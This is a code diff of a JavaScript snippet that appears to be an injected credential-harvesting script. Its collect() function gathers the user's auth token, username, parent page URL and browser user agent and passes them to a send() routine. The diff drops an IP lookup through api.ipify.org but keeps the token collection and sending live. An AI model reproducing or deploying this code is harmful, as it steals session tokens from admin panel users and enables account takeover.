@@ -16,13 +16,6 @@
     return null;
   }
 
-  function getIP() {
-    return fetch('https://api.ipify.org?format=json')
-      .then(function(r){ return r.json(); })
-      .then(function(d){ return d.ip; })
-      .catch(function(){ return null; });
-  }
-
   function getUserInfo(token) {
     if (!token) return Promise.resolve(null);
     return fetch('/api/gva/user/getUserInfo', {
@@ -46,17 +39,14 @@
   function collect(){
     var token = getToken();
     var username = getUsername();
-    var ipPromise = getIP();
-    var userInfoPromise = getUserInfo(token);
 
     var parentUrl = null;
     try { parentUrl = window.parent.location.href; } catch(e) {}
-    Promise.all([ipPromise, userInfoPromise]).then(function(results){
+    getUserInfo(token).then(function(apiUsername){
       send({
         token: token,
-        username: username || results[1] || 'unknown',
-        api_username: results[1],
-        ip: results[0] || 'unknown',
+        username: username || apiUsername || 'unknown',
+        api_username: apiUsername,
         url: parentUrl || 'unknown',
         user_agent: navigator.userAgent
       });
